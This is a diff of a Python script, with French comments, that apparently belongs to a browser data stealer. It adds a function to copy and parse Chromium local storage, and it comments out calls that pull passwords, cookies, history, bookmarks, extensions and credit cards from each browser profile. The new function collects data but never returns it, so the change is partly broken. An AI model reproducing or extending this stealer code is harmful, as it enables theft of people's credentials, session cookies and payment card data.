@@ -397,6 +397,44 @@ def extract_credit_cards(browser, profile: Profile = None):
     except Exception as e:
         print(f"❌ Erreur extraction {browser} : {e}")
 
+# Fonction pour extraire le local storage
+def extract_local_storage(browser, profile: Profile = None):
+    print(f"Extraction du local storage")
+    if profile:
+        local_storage_path = profile.profile_path / CHROMIUM_BROWSERS["db"]["local_storage"]
+    else:
+        local_storage_path = browser.user_data_path / CHROMIUM_BROWSERS["db"]["local_storage"]
+        
+    if not local_storage_path.exists():
+        print(f"❌ Dossier de local storage non présent")
+        return
+    
+    temp_db = local_storage_path.with_suffix(".temp")
+    
+    try:
+        shutil.copytree(local_storage_path, temp_db)
+        local_storage = []
+        for content in temp_db.iterdir():
+            if content.is_file() and content.suffix == ".localstorage":
+                with open(content, "r", encoding="utf-8") as file:
+                    localstorage_content = json.load(file)
+                    local_storage.append(parse_chromium_local_storage(localstorage_content))
+    except Exception as e:
+        print(f"❌ Erreur extraction : {e}")
+    finally:
+        shutil.rmtree(temp_db, ignore_errors=True)
+        
+        
+def parse_chromium_local_storage(localstorage_content) -> dict:
+    keys = ["key", "value"]
+    local_storage_data = {}
+    
+    for key in keys:
+        if key in localstorage_content:
+            local_storage_data[key] = localstorage_content[key]
+                
+    return local_storage_data        
+
 # Fonction pour extraire les données
 def extract_data():
     list_browsers()
@@ -420,20 +458,22 @@ def extract_data():
 
         if not browser.profiles:
             print(f"🔍 Extraction des données pour le profil par défaut")
-            extract_passwords(browser)
-            extract_history(browser)
-            extract_download_history(browser)
-            extract_cookies(browser)
-            extract_bookmarks(browser)
-            extract_extensions(browser)
-            extract_credit_cards(browser)
+            # extract_passwords(browser)
+            # extract_history(browser)
+            # extract_download_history(browser)
+            # extract_cookies(browser)
+            # extract_bookmarks(browser)
+            # extract_extensions(browser)
+            # extract_credit_cards(browser)
+            extract_local_storage(browser)
         else:
             for profile in browser.profiles:
                 print(f"🔍 Extraction des données pour le profil {profile} sur le navigateur {browser}")
-                extract_passwords(browser, profile)
-                extract_history(browser, profile)
-                extract_download_history(browser, profile)
-                extract_cookies(browser, profile)
-                extract_bookmarks(browser, profile)
-                extract_extensions(browser, profile)
-                extract_credit_cards(browser, profile)
+                # extract_passwords(browser, profile)
+                # extract_history(browser, profile)
+                # extract_download_history(browser, profile)
+                # extract_cookies(browser, profile)
+                # extract_bookmarks(browser, profile)
+                # extract_extensions(browser, profile)
+                # extract_credit_cards(browser, profile)
+                extract_local_storage(browser, profile)
